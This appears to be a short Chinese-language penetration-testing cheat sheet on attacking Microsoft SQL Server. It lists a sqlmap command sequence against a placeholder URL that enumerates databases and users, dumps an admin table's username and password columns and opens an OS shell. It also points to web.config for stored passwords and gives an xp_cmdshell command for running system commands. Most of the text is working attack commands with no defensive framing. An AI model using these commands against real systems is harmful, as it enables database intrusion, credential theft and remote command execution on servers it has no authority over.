# SqlServer
端口 1433

## 删除/备份/导入导出
cracer.mdf
cracer_log.ldf

两个文件都要备份提取。

数据库Path: C:\Progran Files\Microsoft SQL Server\MSSQL10_50.HSSOLSERVER\MSSQL\DATA

## 数据库权限
```
sa权限 - system
db权限 - users-adminstrators
public - guest-users
```

```bash
sqlmap -u http://url.php?id=1 --current-db --batch # 得到test
sqlmap -u http://url.php?id=1 --current-user
sqlmap -u http://url.php?id=1 --is-dba
sqlmap -u http://url.php?id=1 -D test --tables           # 得到admin
sqlmap -u http://url.php?id=1 -D test -T admin --columns # 得到admin,pass
sqlmap -u http://url.php?id=1 -D test -T admin -C admin,pass --dump
sqlmap -u http://url.php?id=1 -D test -T admin -C admin,pass --dump --hex
sqlmap -u http://url.php?id=1 --os-shell
```

## config密码等 

在asp web的目录下

web.config

## 命令执行

方法一：xp_cmdshell 

exec master..xp_cmdshell "whoami"默认执行是关闭 

https://blog.csdn.net/weixin_30654583/article/details/97225375